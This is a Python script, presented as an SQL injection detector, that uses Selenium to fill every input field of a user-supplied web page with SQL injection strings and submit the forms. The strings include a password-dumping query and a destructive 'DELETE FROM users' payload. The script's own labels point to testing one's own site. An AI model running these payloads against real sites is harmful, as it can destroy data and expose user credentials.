# SQL injection detector
# goes through given web page
import time
import tkinter as tk
from tkinter import filedialog
from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException
from seleniumrequests import Chrome
from selenium.webdriver.common.keys import Keys

# UI helper functions
def browse_func():
    filename = filedialog.askopenfilename()

def button_click(event):
    url = URLentry.get()
    if (url == ""):
        print("Please enter a url!")

    else:
        runAttacks(url)

def runAttacks(url):
    INJECTION_QUERIES = ["s'; SELECT password FROM users WHERE 1=1; --", "s'; DELETE FROM users WHERE 1=1; --", "1' OR 1=1 --", "%' or 1=1 --"]

    driver = Chrome()
    #print(driver.request('POST', url))
    driver.get(url)
    time.sleep(2)
    form1 = driver.find_element_by_name('txtField')
    try:
        form2 = driver.find_element_by_name('passField')
    except NoSuchElementException:
        print("passField not found")
    forms = driver.find_elements_by_tag_name('input')
    i = 0
    keepGoing = True
    while keepGoing:
        # continue trying until we run out of queries
        for query in INJECTION_QUERIES:
            print("QUERY START: " + query)
            forms = driver.find_elements_by_tag_name('input')
            # we need to input our injections without knowing what inputs require other inputs to submit
            # so loop through every form element not being injected to and fill it with sample data
            for otherForm in forms:
                otherForm.send_keys(query)
                time.sleep(1)

            if not driver.request('POST', url).ok: # returns true if http status code is less than 400
                print("500!")
                print(query)
                #driver.close()
                #driver = Chrome()
                #.get(url)
                forms[i].submit()
                time.sleep(3)
                #break
            else:               #if the form will submit without error,
                forms[i].submit()   #submit the form
                time.sleep(3)

            #form.submit()
            driver.get(url)
            time.sleep(3)

            forms = driver.find_elements_by_tag_name('input')
            for form in forms:
                form.clear()
            time.sleep(2)
        i += 1
        print("i " + str(i))
        print("len forms: " + str(len(forms)))
        if (i >= len(forms)):
            keepGoing = False
            break
    driver.quit()

# setup UI
window = tk.Tk()
label = tk.Label(text="Please enter a URL")
URLentry = tk.Entry()
startButton = tk.Button(text="Start attack")
startButton.bind("<Button-1>", button_click)
canvas = tk.Canvas(window)
#browseButton = tk.Button(canvas, text="Please attach your current database file", command=lambda: button_click(URLentry))
label2 = tk.Label(text="Please save a copy of the database file ")
label3 = tk.Label(text="used by your website before running")

canvas.pack()
label.pack()
label2.pack()
label3.pack()
URLentry.pack()
#browseButton.pack()
startButton.pack()
tk.mainloop()
